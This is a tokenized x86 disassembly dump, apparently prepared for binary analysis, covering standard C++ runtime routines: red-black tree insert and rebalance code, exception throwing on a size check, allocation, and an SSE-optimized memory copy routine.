mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x4 ]
mov bl 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_4049cc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ edx + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_4042d0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ eax ] ecx
nop
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_4042f0
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_404270
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
je r-xdata
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_4042f0
mov eax [ ecx + 0x8 ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_404270
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x0
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_404270
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_4042f0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub_404270
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x8 ] edx
mov edx [ eax ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_4042f0
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_404350
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] edx
retn
lea esp [ esp ]
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_4043c0
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ eax + 0x4 ]
push edi
mov edi [ ebp + 0xc ]
cmp edi [ eax ]
jne r-xdata
mov ecx [ eax + 0x4 ]
push ebx
push 0x1
push esi
mov ebx eax
call sub_404650
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp edi eax
jne r-xdata
mov eax [ ebx + 0xc ]
cmp eax [ edi + 0xc ]
jge r-xdata
mov eax [ ebx + 0xc ]
cmp [ edi + 0xc ] eax
jle r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ecx + 0xc ]
cmp edx [ ebx + 0xc ]
jge r-xdata
mov eax [ ebp + 0x8 ]
push ebx
lea edi [ ebp - 0xc ]
call sub_404560
mov eax [ eax ]
pop edi
mov [ esi ] eax
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push 0x1
push esi
mov ecx edi
call sub_404650
pop edi
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
jge r-xdata
mov ecx edi
mov [ ebp - 0x4 ] ecx
cmp [ edi + 0x15 ] 0x0
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push 0x0
push esi
call sub_404650
pop edi
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
call sub_404350
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ eax ] ecx
mov ecx [ ebp - 0x4 ]
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
jmp r-xdata
mov edx [ edi + 0x8 ]
cmp [ edx + 0x15 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax [ ecx + 0xc ]
jge r-xdata
mov eax [ edi + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] ecx
push 0x1
push esi
call sub_404650
pop edi
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push 0x0
push esi
mov ecx edi
call sub_404650
pop edi
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
lea ecx [ ecx ]
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
cmp [ edi + 0xc ] eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
je r-xdata
mov eax [ ebx + 0xc ]
cmp [ ecx + 0xc ] eax
jge r-xdata
mov ecx eax
mov ecx eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
jmp r-xdata
push 0x1
push esi
mov ecx edi
call sub_404650
pop edi
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push 0x0
push esi
call sub_404650
pop edi
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ecx [ eax ]
jne r-xdata
sub_404560
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov dl 0x1
push esi
mov [ ebp - 0x4 ] dl
jne r-xdata
mov esi ecx
test dl dl
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ecx + 0xc ]
nop
mov eax [ ebp + 0x8 ]
mov edx [ esi + 0xc ]
push eax
cmp edx [ eax + 0xc ]
jge r-xdata
mov edx [ ebx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
call sub_4049cc
add esp 0x4
mov [ edi ] esi
pop esi
mov [ edi + 0x4 ] 0x0
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
jmp r-xdata
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x1
cmp esi [ eax + 0xc ]
mov ecx eax
setl dl
mov [ ebp - 0x4 ] dl
test dl dl
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea edx [ ebp + 0x8 ]
push edx
call sub_404650
mov eax [ eax ]
pop esi
mov [ edi ] eax
mov [ edi + 0x4 ] 0x1
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov esi [ ecx + 0x8 ]
jmp r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
cmp [ esi + 0x15 ] 0x0
jne r-xdata
cmp esi [ eax ]
jne r-xdata
jmp r-xdata
mov esi eax
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov esi eax
mov eax [ esi + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
jmp r-xdata
sub_404650
push ebp
mov ebp esp
mov edx [ ebx + 0x8 ]
cmp edx 0x1ffffffe
jb r-xdata
inc edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] edx
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
xor al al
cmp ecx edx
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_4049cc
add esp 0x4
push r--data
call sub_4048f7
cmp [ ebp + 0xc ] al
je r-xdata
mov [ edx + 0x4 ] edi
mov ecx [ ebx + 0x4 ]
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov [ ecx + 0x8 ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x8 ] edi
mov edx [ edi + 0x4 ]
mov ecx edi
cmp [ edx + 0x14 ] al
jne r-xdata
mov [ edx ] edi
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
mov [ ecx + 0x14 ] 0x1
pop edi
pop ebp
retn 0xc
push esi
mov esi [ esi ]
cmp [ esi + 0x14 ] al
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] al
jne r-xdata
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx ]
mov esi [ edx + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x14 ] al
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
sub_404870
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_4049d7
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
call sub_404adf
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_405255
int3
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] dx
cmp ecx edx
je r-xdata
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov [ ecx ] edx
mov edx [ edi + 0x4 ]
mov [ ecx + 0x4 ] edx
sub_4048f7
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_404adf
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_405255
int3
sub_404944
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_404adf
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_405255
int3
sub_404991
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_404b3b
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_4049cc
pop ecx
sub_4049d7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_404f7b
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_4054f0
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_404b6d
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_405255
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_404a57
push sub_40aa0f
mov [ rw-data ] esi
call sub_4054ca
pop ecx
sub_404a81
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_405580
lea esi [ eax + 0x1 ]
push esi
call sub_404f7b
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_405518
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_404adf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_404a81
mov eax esi
pop esi
pop ebp
retn 0x4
sub_404b06
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_404ac1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_404a81
jmp r-xdata
sub_404b46
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_404ac1
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_4049cc
pop ecx
sub_404b6d
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_404b06
mov eax esi
pop esi
pop ebp
retn 0x4
sub_404ba0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_404c24 ]
jmp [ ecx * 4 + jump_table_404ca4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_404d10 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_404eac ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_404db0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_404eac ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_404d10 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_404eac ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_404d10 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_404d10 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_404d10 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_404eac ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_404eac ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_404eac ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
